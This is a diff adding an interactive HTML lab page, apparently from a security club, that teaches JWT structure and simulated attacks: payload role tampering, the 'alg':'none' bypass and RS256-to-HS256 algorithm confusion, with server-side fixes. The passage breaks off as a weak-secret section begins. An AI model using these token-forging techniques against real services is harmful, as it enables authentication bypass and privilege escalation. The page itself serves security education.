@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>JWT Lab — Securinets Esprit</title>
+<style>
+:root{
+  --red:#b31217; --red-dark:#7a0d10; --red-light:#e23a3e;
+  --bg:#ffffff; --bg2:#f7f3f3; --ink:#161414; --ink2:#5a5252;
+  --line:#e7dede; --danger:#b31217; --safe:#1d7a4a; --mono:ui-monospace,Consolas,monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){
+  :root{ --bg:#141011; --bg2:#1c1617; --ink:#f2eaea; --ink2:#c9b9b9; --line:#3a2b2c; }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:system-ui,sans-serif;line-height:1.6;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+.hero{
+  background:
+    radial-gradient(circle at 20px 20px, var(--red) 1.4px, transparent 1.6px) 0 0/16px 16px,
+    linear-gradient(180deg,var(--ink) 0%, var(--red-dark) 70%, var(--red) 100%);
+  color:#fff;padding:3rem 1.5rem 2.5rem;text-align:center
+}
+.hero h1{margin:.2rem 0;font-size:clamp(28px,5vw,42px);letter-spacing:1px}
+.hero h1 span{color:#ffd9d9}
+.hero p{color:#f0d6d6;max-width:620px;margin:.6rem auto 0;font-size:15px}
+.badge{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.35);
+  border-radius:999px;padding:4px 14px;font-size:12px;letter-spacing:2px;text-transform:uppercase}
+main{max-width:780px;margin:0 auto;padding:1.5rem}
+section{margin:2.5rem 0;padding-top:.5rem}
+h2{font-size:21px;border-left:4px solid var(--red);padding-left:10px;margin-bottom:.3rem}
+.step{color:var(--red);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase}
+p.lead{color:var(--ink2);font-size:15px}
+.card{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;margin:1rem 0}
+pre{font-family:var(--mono);font-size:13.5px;white-space:pre-wrap;word-break:break-word;margin:0;line-height:1.7}
+.tag{color:var(--ink2)}
+.kw{color:var(--red-light);font-weight:600}
+input[type=text]{width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid var(--line);
+  background:var(--bg);color:var(--ink);font-family:var(--mono);font-size:14px}
+input[type=text]:focus{outline:2px solid var(--red-light);border-color:var(--red-light)}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:.7rem}
+button{background:var(--red);color:#fff;border:0;border-radius:10px;padding:10px 16px;
+  font-size:13.5px;font-weight:600;cursor:pointer}
+button.ghost{background:transparent;border:1.5px solid var(--red);color:var(--red)}
+button:active{transform:scale(.97)}
+.status{font-size:13px;font-weight:600;padding:8px 12px;border-radius:8px;margin-top:.6rem;display:none}
+.status.safe{display:block;background:#e4f5ec;color:var(--safe)}
+.status.danger{display:block;background:#fbe2e2;color:var(--danger)}
+@media (prefers-color-scheme: dark){.status.safe{background:#123324}.status.danger{background:#3a1214}}
+.payloads{display:grid;gap:10px}
+.pl{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+.pl code{font-family:var(--mono);font-size:13px;color:var(--red-light);word-break:break-word}
+.pl .why{color:var(--ink2);font-size:13px;margin-top:5px}
+.pl button{margin-top:8px}
+.copied{color:var(--safe);font-size:12px;font-weight:600;margin-left:8px}
+.flow{display:flex;align-items:center;justify-content:space-between;margin:1.2rem 0;position:relative}
+.flow .node{flex:1;text-align:center;font-size:12.5px;color:var(--ink2)}
+.flow .node i{display:block;width:46px;height:46px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--line);
+  margin:0 auto 6px;font-size:20px;display:flex;align-items:center;justify-content:center}
+.flow .track{flex:2;height:2px;background:var(--line);position:relative;margin-top:-24px}
+.flow .fdot{position:absolute;top:-4px;left:0;width:10px;height:10px;border-radius:50%;background:var(--red);opacity:0}
+.flow .fdot.go{animation:travel 1.4s ease forwards}
+@keyframes travel{0%{left:0;opacity:1}90%{opacity:1}100%{left:calc(100% - 10px);opacity:1}}
+.steps{margin-top:.6rem}
+.steps div{opacity:0;transform:translateY(4px);transition:opacity .3s,transform .3s;font-size:13.5px;color:var(--ink2);padding:3px 0}
+.steps div.show{opacity:1;transform:none}
+.steps div b{color:var(--ink)}
+footer{text-align:center;color:var(--ink2);font-size:12px;padding:2rem 1rem}
+
+/* ===== shared reveal/animation system ===== */
+.xv-wrap{margin-top:1.1rem;border:1px solid var(--line);border-radius:14px;padding:14px 16px;background:var(--bg2)}
+.xv-title{font-size:11.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink2);font-weight:700;margin-bottom:10px}
+
+.xv-boundary{position:relative;display:flex;gap:0;border-radius:10px;overflow:hidden;border:1.5px solid var(--line)}
+.xv-zone{flex:1;padding:16px 12px;text-align:center;font-size:12.5px;color:var(--ink2);position:relative;background:var(--bg);transition:background .35s,color .35s}
+.xv-zone .xv-ico{font-size:22px;display:block;margin-bottom:4px}
+.xv-zone.xv-data{border-right:1.5px dashed var(--line)}
+.xv-zone.xv-code.xv-hot{background:var(--red);color:#fff}
+.xv-zone.xv-code.xv-hot .xv-ico{animation:xv-shake .4s ease}
+.xv-zone.xv-data.xv-calm{background:#e4f5ec}
+@media (prefers-color-scheme: dark){.xv-zone.xv-data.xv-calm{background:#123324}}
+.xv-ball{position:absolute;top:50%;left:8%;width:12px;height:12px;border-radius:50%;background:var(--red);
+  transform:translate(0,-50%) scale(0);box-shadow:0 0 0 0 rgba(179,18,23,.5);z-index:2}
+.xv-ball.xv-fire-safe{animation:xv-hop-safe 1s ease forwards}
+.xv-ball.xv-fire-danger{animation:xv-hop-danger 1s ease forwards}
+@keyframes xv-hop-safe{0%{left:8%;transform:translate(0,-50%) scale(1)}100%{left:42%;transform:translate(0,-50%) scale(1)}}
+@keyframes xv-hop-danger{0%{left:8%;transform:translate(0,-50%) scale(1)}55%{left:50%;transform:translate(0,-70%) scale(1.15)}100%{left:88%;transform:translate(0,-50%) scale(1)}}
+@keyframes xv-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px) rotate(-6deg)}75%{transform:translateX(3px) rotate(6deg)}}
+.xv-caption{text-align:center;font-size:12px;color:var(--ink2);margin-top:8px;min-height:16px}
+
+.xv-tl{display:flex;flex-direction:column;gap:0;margin-top:4px}
+.xv-tlrow{display:flex;gap:10px;align-items:flex-start;opacity:.25;transform:translateX(-6px);transition:opacity .35s,transform .35s}
+.xv-tlrow.on{opacity:1;transform:none}
+.xv-tlnum{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:var(--bg);border:1.5px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--ink2);margin-top:1px}
+.xv-tlrow.on .xv-tlnum{background:var(--red);border-color:var(--red);color:#fff}
+.xv-tltext{font-size:13px;color:var(--ink2);padding-top:2px}
+.xv-tlrow.on .xv-tltext{color:var(--ink)}
+.xv-tlline{width:1.5px;background:var(--line);margin-left:10.25px;height:14px}
+.xv-tlrow.on + .xv-tlline{background:var(--red)}
+.xv-flash{position:relative}
+.xv-flash.xv-pulse::after{content:"";position:absolute;inset:0;border-radius:12px;pointer-events:none;
+  box-shadow:0 0 0 0 rgba(179,18,23,.55);animation:xv-ring .6s ease}
+@keyframes xv-ring{0%{box-shadow:0 0 0 0 rgba(179,18,23,.55)}100%{box-shadow:0 0 0 14px rgba(179,18,23,0)}}
+
+.xv-ctxmap{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px}
+.xv-ctx{border:1.5px solid var(--line);border-radius:10px;padding:10px;text-align:center;font-size:12px;color:var(--ink2);
+  background:var(--bg);opacity:0;transform:translateY(6px);transition:opacity .4s,transform .4s}
+.xv-ctx.show{opacity:1;transform:none}
+.xv-ctx .xv-ico{font-size:20px;display:block;margin-bottom:4px;animation:xv-float 2.6s ease-in-out infinite}
+.xv-ctx code{display:block;margin-top:5px;font-family:var(--mono);font-size:11px;color:var(--red-light);word-break:break-word}
+@keyframes xv-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
+
+.xv-hijack{display:flex;align-items:center;gap:6px;justify-content:space-between;margin-top:6px}
+.xv-hpanel{flex:1;text-align:center;font-size:12px;color:var(--ink2);padding:10px 6px;border-radius:10px;border:1.5px solid var(--line);background:var(--bg)}
+.xv-hpanel .xv-ico{font-size:24px;display:block;margin-bottom:4px}
+.xv-harrow{flex:0 0 28px;text-align:center;color:var(--red);font-size:18px;position:relative;overflow:visible}
+.xv-harrow span{display:inline-block;animation:xv-drift 1.4s ease-in-out infinite}
+@keyframes xv-drift{0%,100%{transform:translateX(0);opacity:.6}50%{transform:translateX(4px);opacity:1}}
+.xv-hpanel.xv-win{border-color:var(--red);background:#fde3e3}
+@media (prefers-color-scheme: dark){.xv-hpanel.xv-win{background:#4a1416}}
+
+/* ===== JWT-specific additions ===== */
+/* token anatomy */
+.jt-token{
+  display:flex;flex-wrap:wrap;align-items:stretch;gap:0;border-radius:12px;overflow:hidden;
+  border:1.5px solid var(--line);background:var(--bg);font-family:var(--mono);font-size:13px;
+  line-height:1.9;margin-top:.8rem;transition:box-shadow .3s;
+}
+.jt-part{padding:8px 10px;word-break:break-all;color:var(--ink);position:relative;cursor:pointer;
+  transition:background .3s,color .3s;flex:1 1 auto;min-width:0}
+.jt-part:hover{filter:brightness(1.05)}
+.jt-hdr{background:#fde3e3;color:#7a0d10}
+.jt-pld{background:#fff1d6;color:#7a4d0d}
+.jt-sig{background:#dfeef6;color:#0d4f6e}
+@media (prefers-color-scheme: dark){
+  .jt-hdr{background:#4a1416;color:#ffb3b3}
+  .jt-pld{background:#4a2e08;color:#f5c87a}
+  .jt-sig{background:#0e2b3a;color:#8fcde8}
+}
+.jt-dot{padding:8px 4px;color:var(--ink2);font-weight:700;align-self:center;background:var(--bg)}
+.jt-part.tampered{
+  animation:jt-shake .5s ease;
+  outline:2px solid var(--red);
+  outline-offset:-2px;
+}
+@keyframes jt-shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-4px)}60%{transform:translateX(4px)}}
+.jt-broken{box-shadow:0 0 0 3px rgba(179,18,23,.25)}
+
+/* decoded panels */
+.jt-decoded{display:grid;grid-template-columns:1fr;gap:10px;margin-top:10px}
+.jt-card{border:1.5px solid var(--line);border-radius:10px;background:var(--bg);padding:10px 12px;
+  opacity:0;transform:translateY(6px);transition:opacity .4s,transform .4s}
+.jt-card.show{opacity:1;transform:none}
+.jt-card .jt-h{font-size:10.5px;letter-spacing:1.2px;text-transform:uppercase;color:var(--ink2);font-weight:700;
+  display:flex;align-items:center;gap:6px;margin-bottom:6px}
+.jt-card .jt-h .sw{width:10px;height:10px;border-radius:3px}
+.jt-card pre{font-size:12px;line-height:1.65;color:var(--ink)}
+.jt-card.hdr .sw{background:#e23a3e}
+.jt-card.pld .sw{background:#e8a33a}
+.jt-card.sig .sw{background:#3a9fd6}
+.jt-card pre .key{color:var(--red-light)}
+.jt-card pre .str{color:#1d7a4a}
+@media (prefers-color-scheme: dark){.jt-card pre .str{color:#66d29b}}
+
+/* tamper control */
+.jt-control{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:10px}
+.jt-control select, .jt-control input{padding:9px 11px;border-radius:9px;border:1.5px solid var(--line);
+  background:var(--bg);color:var(--ink);font-family:var(--mono);font-size:13px}
+.jt-control select:focus, .jt-control input:focus{outline:2px solid var(--red-light);border-color:var(--red-light)}
+
+/* verification flow */
+.jt-verify{display:flex;flex-direction:column;gap:8px;margin-top:12px}
+.jt-vrow{display:flex;align-items:center;gap:10px;padding:9px 11px;border-radius:10px;
+  border:1.5px solid var(--line);background:var(--bg);font-size:12.5px;color:var(--ink2);
+  opacity:.35;transform:translateX(-6px);transition:opacity .35s,transform .35s,border-color .3s,background .3s}
+.jt-vrow.on{opacity:1;transform:none}
+.jt-vrow.ok{border-color:var(--safe);background:#e4f5ec;color:var(--safe)}
+.jt-vrow.bad{border-color:var(--red);background:#fde3e3;color:var(--danger)}
+@media (prefers-color-scheme: dark){.jt-vrow.ok{background:#123324}.jt-vrow.bad{background:#4a1416}}
+.jt-vrow .num{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700}
+.jt-vrow.on .num{background:var(--red);border-color:var(--red);color:#fff}
+.jt-vrow.ok .num{background:var(--safe);border-color:var(--safe);color:#fff}
+.jt-vrow.bad .num{background:var(--red);border-color:var(--red);color:#fff}
+.jt-vrow .txt{flex:1}
+.jt-vrow .txt code{font-family:var(--mono);font-size:11.5px;color:var(--red-light);word-break:break-word}
+.jt-vrow .icon{font-size:16px;min-width:18px;text-align:center}
+
+/* alg none attack */
+.jt-alg{padding:12px;border:1.5px solid var(--line);border-radius:10px;background:var(--bg);margin-top:10px;
+  font-family:var(--mono);font-size:12.5px}
+.jt-alg .label{color:var(--ink2);font-size:11px;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.jt-alg .val{color:var(--red);font-weight:700}
+.jt-alg .val.safe{color:var(--safe)}
+.jt-alg .pulse{animation:jt-pulse .5s ease}
+@keyframes jt-pulse{0%,100%{background:transparent}50%{background:#fde3e3}}
+
+/* algorithm confusion diagram */
+.jt-confusion{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+@media (max-width:640px){.jt-confusion{grid-template-columns:1fr}}
+.jt-side{border:1.5px solid var(--line);border-radius:12px;padding:12px;background:var(--bg);position:relative;overflow:hidden}
+.jt-side.vuln{border-color:#e9b0b0}
+.jt-side .sh{font-size:11px;letter-spacing:1px;text-transform:uppercase;font-weight:700;color:var(--ink2);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.jt-side.vuln .sh{color:var(--red)}
+.jt-side ul{margin:0;padding-left:16px;font-size:12px;color:var(--ink2)}
+.jt-side li{margin:4px 0}
+.jt-side code{font-family:var(--mono);font-size:11.5px;color:var(--red-light);word-break:break-word}
+.jt-side .badge2{display:inline-block;font-size:10.5px;padding:2px 8px;border-radius:999px;background:var(--bg2);
+  border:1px solid var(--line);color:var(--ink2);margin-left:6px}
+
+/* brute-force wordlist */
+.jt-wordlist{border:1.5px solid var(--line);border-radius:10px;background:var(--bg);max-height:180px;
+  overflow-y:auto;font-family:var(--mono);font-size:12px;margin-top:10px}
+.jt-wordlist .w{padding:5px 10px;border-bottom:1px solid var(--line);color:var(--ink2);
+  display:flex;justify-content:space-between;align-items:center;gap:8px}
+.jt-wordlist .w:last-child{border-bottom:0}
+.jt-wordlist .w.trying{background:#fff1d6;color:#7a4d0d;font-weight:600}
+.jt-wordlist .w.hit{background:#fde3e3;color:#7a0d10;font-weight:700}
+@media (prefers-color-scheme: dark){.jt-wordlist .w.trying{background:#4a2e08;color:#f5c87a}.jt-wordlist .w.hit{background:#4a1416;color:#ffb3b3}}
+.jt-wordlist .w .badge3{font-size:10px;padding:1px 6px;border-radius:999px;border:1px solid currentColor;opacity:.7}
+
+/* privilege ladder */
+.jt-ladder{display:flex;flex-direction:column;gap:8px;margin-top:12px}
+.jt-rung{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;
+  border:1.5px solid var(--line);background:var(--bg);font-size:13px;transition:all .35s}
+.jt-rung .lvl{font-family:var(--mono);font-size:11px;padding:2px 8px;border-radius:999px;
+  background:var(--bg2);border:1px solid var(--line);color:var(--ink2)}
+.jt-rung .tag2{margin-left:auto;font-size:11px;color:var(--ink2)}
+.jt-rung.current{border-color:var(--red);background:#fde3e3;font-weight:600}
+.jt-rung.current .lvl{background:var(--red);color:#fff;border-color:var(--red)}
+.jt-rung.current .tag2{color:var(--red);font-weight:700}
+@media (prefers-color-scheme: dark){.jt-rung.current{background:#4a1416}}
+.jt-rung.reached{animation:jt-rung-pulse .8s ease}
+@keyframes jt-rung-pulse{0%,100%{box-shadow:0 0 0 0 rgba(179,18,23,0)}50%{box-shadow:0 0 0 8px rgba(179,18,23,.25)}}
+
+/* terminal */
+.jt-term{border-radius:12px;overflow:hidden;border:1px solid var(--line);margin-top:1rem}
+.jt-term .bar{background:#2a2222;padding:7px 10px;font-size:12px;color:#d8caca;display:flex;gap:6px;align-items:center}
+.jt-term .screen{background:#120e0e;color:#8df0a0;font-family:var(--mono);font-size:12.5px;padding:14px;
+  min-height:70px;white-space:pre-wrap;word-break:break-word;line-height:1.7}
+.jt-term .screen .err{color:#ff9b9b}
+.jt-term .screen .hdr{color:#ffd9d9}
+.jt-term .screen .ok{color:#8df0a0}
+.jt-term .screen .warn{color:#ffd27a}
+.jt-caret{display:inline-block;width:7px;height:13px;background:#8df0a0;vertical-align:-2px;animation:jt-caret 1s step-end infinite}
+@keyframes jt-caret{50%{opacity:0}}
+.jt-sim-badge{display:inline-block;font-size:10.5px;letter-spacing:1px;text-transform:uppercase;font-weight:700;
+  color:var(--ink2);background:var(--bg2);border:1px solid var(--line);border-radius:999px;padding:2px 9px;margin-left:6px}
+
+/* attack surface cards */
+.jt-opgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.jt-op{border:1.5px solid var(--line);border-radius:12px;padding:12px;background:var(--bg);
+  opacity:0;transform:translateY(8px) scale(.97);transition:opacity .4s,transform .4s}
+.jt-op.show{opacity:1;transform:none}
+.jt-op .name{font-weight:700;font-size:13px;margin-bottom:6px}
+.jt-op .row2{font-size:11.5px;color:var(--ink2);margin-top:5px}
+.jt-op .row2 code{font-family:var(--mono);font-size:11px;color:var(--red-light);word-break:break-word}
+
+/* token viewer */
+.jt-viewer{border:1.5px solid var(--line);border-radius:14px;background:var(--bg);padding:14px;margin-top:1rem;
+  transition:border-color .3s,box-shadow .3s}
+.jt-viewer.alert{border-color:var(--red);box-shadow:0 0 0 3px rgba(179,18,23,.12)}
+.jt-viewer .topline{display:flex;justify-content:space-between;align-items:center;font-size:11px;
+  letter-spacing:1px;text-transform:uppercase;color:var(--ink2);font-weight:700;margin-bottom:8px}
+.jt-viewer .verdict{font-size:11px;padding:3px 10px;border-radius:999px;border:1.5px solid var(--line)}
+.jt-viewer .verdict.ok{color:var(--safe);border-color:var(--safe);background:#e4f5ec}
+.jt-viewer .verdict.bad{color:#fff;border-color:var(--red);background:var(--red)}
+@media (prefers-color-scheme: dark){.jt-viewer .verdict.ok{background:#123324}}
+
+/* live toggle */
+.jt-switch{display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--ink2);cursor:pointer;user-select:none}
+.jt-switch .track{width:38px;height:22px;border-radius:999px;background:var(--line);position:relative;transition:background .25s}
+.jt-switch .knob{position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:#fff;
+  transition:transform .25s;box-shadow:0 1px 3px rgba(0,0,0,.25)}
+.jt-switch input{display:none}
+.jt-switch input:checked + .track{background:var(--red)}
+.jt-switch input:checked + .track .knob{transform:translateX(16px)}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="badge">Securinets Esprit</span>
+  <h1>JWT <span>— JSON Web Tokens</span></h1>
+  <p>Three strings glued together by dots. One of them is signed. Change what's inside and watch the
+  signature stop matching — then watch what happens when the server stops checking. Everything below is
+  simulated; nothing here touches a real server.</p>
+</div>
+
+<main>
+
+<!-- ============================================================ STEP 1 -->
+<section id="s1">
+  <div class="step">Step 1 — what a token actually is</div>
+  <h2>Three parts, glued by two dots</h2>
+  <p class="lead">A JWT has a fixed shape: <b>header</b>, <b>payload</b>, <b>signature</b> — each one
+  base64url-encoded and separated by a <code>.</code>. Below is the token you were just issued as <b>alice</b>,
+  with a real signature. Hover or tap any segment to see what's inside.</p>
+
+  <div class="jt-viewer" id="viewer">
+    <div class="topline"><span>Bearer token — issued to alice</span><span class="verdict ok" id="viewerVerdict">✓ signature valid</span></div>
+    <div class="jt-token" id="tokenEl">
+      <span class="jt-part jt-hdr" id="tokHdr" title="header">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
+      <span class="jt-dot">.</span>
+      <span class="jt-part jt-pld" id="tokPld" title="payload">eyJzdWIiOiI3IiwibmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MzEwMDAwMDB9</span>
+      <span class="jt-dot">.</span>
+      <span class="jt-part jt-sig" id="tokSig" title="signature">4kZ0xJ8m2nQpL7vR9sT1wY3bC5dE6fG7hI8jK9lM0nA</span>
+    </div>
+  </div>
+
+  <div class="jt-decoded" id="decoded">
+    <div class="jt-card hdr" id="dcHdr"><div class="jt-h"><span class="sw"></span>header — base64url-decoded</div><pre id="dcHdrPre"></pre></div>
+    <div class="jt-card pld" id="dcPld"><div class="jt-h"><span class="sw"></span>payload — base64url-decoded</div><pre id="dcPldPre"></pre></div>
+    <div class="jt-card sig" id="dcSig"><div class="jt-h"><span class="sw"></span>signature — <span style="color:var(--red-light)">not decodable</span></div><pre id="dcSigPre"></pre></div>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Live view — is the payload trusted?</div>
+    <div class="xv-boundary" id="xvBoundary">
+      <div class="xv-zone xv-data" id="xvZoneData"><span class="xv-ico">📦</span>Your payload<br>(signed, trusted)</div>
+      <div class="xv-zone xv-code" id="xvZoneCode"><span class="xv-ico">🕶️</span>Any payload<br>(if sig isn't checked)</div>
+      <div class="xv-ball" id="xvBall"></div>
+    </div>
+    <div class="xv-caption" id="xvCaption">Tap a segment above, or scroll to Step 2 to tamper with the payload.</div>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">The token as the server sees it</div>
+    <pre class="jt-alg" id="serverLine"><span class="label">Authorization header</span><span class="val" id="serverLineVal">Bearer eyJhbGciOiJIUzI1NiIs…</span></pre>
+  </div>
+</section>
+
+<!-- ============================================================ STEP 2 -->
+<section id="s2">
+  <div class="step">Step 2 — your first real payload</div>
+  <h2>Change one word. Break the signature. Gain admin.</h2>
+  <p class="lead">The payload is the interesting part: it's just JSON. It says you are <code>alice</code>,
+  your role is <code>user</code>. If you can change that word to <code>admin</code> <i>and</i> the server
+  stops caring about the signature, you're an administrator.</p>
+
+  <div class="card">
+    <pre class="jt-alg" id="payloadCard"><span class="label">decoded payload</span><span class="val" id="payloadCardVal">{ "sub":"7", "name":"alice", "role":"user", "iat":1731000000 }</span></pre>
+  </div>
+
+  <div class="jt-control">
+    <label style="font-size:13px;color:var(--ink2)">change role to:</label>
+    <select id="roleSelect">
+      <option value="user">user</option>
+      <option value="staff">staff</option>
+      <option value="admin">admin</option>
+      <option value="superadmin">superadmin</option>
+    </select>
+    <button onclick="tamperRole()">Tamper the payload</button>
+    <button class="ghost" onclick="resetToken()">Reset token</button>
+  </div>
+  <div class="row" style="margin-top:6px">
+    <label class="jt-switch">
+      <input type="checkbox" id="verifyToggle">
+      <span class="track"><span class="knob"></span></span>
+      <span>server verifies signature</span>
+    </label>
+  </div>
+  <div id="tamperStatus" class="status"></div>
+
+  <div class="xv-flash" id="xvTermFlash">
+    <div class="jt-term">
+      <div class="bar"><span class="dot" style="background:#ff6159"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span>
+        &nbsp;app.example — simulated server<span class="jt-sim-badge">simulated</span></div>
+      <div class="screen" id="jtConsole">waiting for a request<span class="jt-caret"></span></div>
+    </div>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">What the server does with your token, step by step</div>
+    <div class="jt-verify" id="verifyRows">
+      <div class="jt-vrow" id="vr1"><div class="num">1</div><div class="txt">Split the token into 3 parts at the <code>.</code> dots</div><div class="icon">·</div></div>
+      <div class="jt-vrow" id="vr2"><div class="num">2</div><div class="txt">Read the header to decide which algorithm to verify with</div><div class="icon">·</div></div>
+      <div class="jt-vrow" id="vr3"><div class="num">3</div><div class="txt">Re-sign <code>header.payload</code> with the server's secret and compare to the signature</div><div class="icon">·</div></div>
+      <div class="jt-vrow" id="vr4"><div class="num">4</div><div class="txt">If the signatures match → trust the payload. If not → reject with 401.</div><div class="icon">·</div></div>
+    </div>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">What the server does, in the order it does it</div>
+    <div class="xv-tl" id="xvTimeline">
+      <div class="xv-tlrow" id="xvT1"><div class="xv-tlnum">1</div><div class="xv-tltext">Token arrives in the <code>Authorization: Bearer …</code> header. Nothing inside it is trusted yet.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT2"><div class="xv-tlnum">2</div><div class="xv-tltext">The server re-computes the signature from the header, the payload and its own secret.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT3"><div class="xv-tlnum">3</div><div class="xv-tltext">If you changed even one character of the payload, the recomputed signature changes completely — mismatch.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT4"><div class="xv-tlnum">4</div><div class="xv-tltext">Reject: <code>401 Unauthorized</code>. The signature is the entire security of a JWT — and the whole reason the attacks below exist.</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ STEP 3 -->
+<section id="s3">
+  <div class="step">Step 3 — what the signature is supposed to do</div>
+  <h2>HMAC vs RSA — two ways to sign</h2>
+  <p class="lead">The signature is a keyed hash over <code>header.payload</code>. With <b>HS256</b> the same
+  secret both signs and verifies — so it must never leave the server. With <b>RS256</b> a private key signs
+  and a <i>public</i> key verifies — that public key can be shared freely. Each design has a different
+  attack.</p>
+
+  <div class="jt-confusion">
+    <div class="jt-side">
+      <div class="sh">✓ HS256 — shared secret</div>
+      <ul>
+        <li>One secret <code>s3cr3t</code> signs and verifies.</li>
+        <li>If it leaks → attacker can forge any token.</li>
+        <li>If it's weak → attacker can brute-force it offline.</li>
+      </ul>
+    </div>
+    <div class="jt-side vuln">
+      <div class="sh">⚠ RS256 — public / private</div>
+      <ul>
+        <li>Private key signs, <b>public key verifies</b>.</li>
+        <li>Public key is, by design, public.</li>
+        <li>If the server trusts the header's <code>alg</code> → attacker swaps RS256 for HS256 and uses the public key as the HMAC secret.</li>
+      </ul>
+    </div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem">That's also why step 2's toggle matters. The signature is only
+  useful if the server actually <b>checks it</b>, and if it checks it with the <b>right algorithm</b>. Every
+  attack in the next few steps breaks one of those two assumptions.</p>
+</section>
+
+<!-- ============================================================ STEP 4 -->
+<section id="s4">
+  <div class="step">Step 4 — attack 1: "alg": "none"</div>
+  <h2>Tell the server not to check</h2>
+  <p class="lead">The header itself names the algorithm. If the server blindly trusts it, you can set
+  <code>"alg":"none"</code> and strip the signature entirely. Any payload you want, no key required.</p>
+
+  <div class="jt-alg" id="algNoneCard">
+    <div class="label">tampered header</div>
+    <div class="val" id="algNoneVal">{ "alg":"none", "typ":"JWT" }</div>
+    <div class="label" style="margin-top:8px">tampered payload</div>
+    <div class="val" id="algNonePld">{ "sub":"7", "name":"alice", "role":"admin" }</div>
+    <div class="label" style="margin-top:8px">signature</div>
+    <div class="val" id="algNoneSig">(empty)</div>
+  </div>
+
+  <div class="row"><button onclick="runNoneAttack()">Run the "none" attack</button></div>
+  <div id="noneStatus" class="status"></div>
+
+  <div class="jt-term">
+    <div class="bar"><span class="dot" style="background:#ff6159"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span>
+      &nbsp;app.example — simulated vulnerable verifier<span class="jt-sim-badge">simulated</span></div>
+    <div class="screen" id="jtNoneConsole">waiting for a tampered token<span class="jt-caret"></span></div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem;font-size:13.5px"><b>The fix:</b> the server must pin the
+  algorithm it expects — <code>jwt.verify(token, secret, { algorithms: ["HS256"] })</code> — and reject
+  <code>none</code> outright. Never let the token's own header pick the algorithm.</p>
+</section>
+
+<!-- ============================================================ STEP 5 -->
+<section id="s5">
+  <div class="step">Step 5 — attack 2: algorithm confusion</div>
+  <h2>Public key in. Forged token out.</h2>
+  <p class="lead">With RS256 the public key is, by definition, public. If the server trusts the header's
+  <code>alg</code>, you change it from <code>RS256</code> to <code>HS256</code> — and sign with the
+  <b>public key you already have</b> as if it were an HMAC secret. The server does the same thing, gets the
+  same result, and lets you in.</p>
+
+  <div class="jt-term">
+    <div class="bar"><span class="dot" style="background:#ff6159"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span>
+      &nbsp;victim — simulated RS256 verifier<span class="jt-sim-badge">simulated</span></div>
+    <div class="screen" id="jtConfConsole">waiting for a forged token<span class="jt-caret"></span></div>
+  </div>
+
+  <div class="row" style="margin-top:10px"><button onclick="runConfusionAttack()">Run the confusion attack</button></div>
+  <div id="confStatus" class="status"></div>
+
+  <div class="card">
+    <div class="xv-title" style="margin-bottom:8px">Why it works — the same bytes, two meanings</div>
+    <div class="flow">
+      <div class="node"><i>🔑</i>public.pem<br>(was a verifier)</div>
+      <div class="track"><div class="fdot" id="confDot"></div></div>
+      <div class="node"><i>🧮</i>HMAC-SHA256<br>(attacker's secret)</div>
+    </div>
+    <div class="xv-caption" id="confCaption">The public key is a public string. HMAC takes a string. Same string, different meaning.</div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem;font-size:13.5px"><b>The fix:</b> pin the expected algorithm on
+  the server. Never let the token's header choose it. If you publish RS256, verify only RS256.</p>
+</section>
+
+<!-- ============================================================ STEP 6 -->
+<section id="s6">
+  <div class="step">Step 6 — attack 3: the weak secret</div>
+  <h2>If the secret is a dictionary word, you already have it</h2>
+  <p class="lead">HS256 tokens are <b>offline-verifiable</b>: anyone holding a valid token can try candidate
+  secrets locally, with no rate limit. A short, human-memorable secret is the most common JWT weakness in the
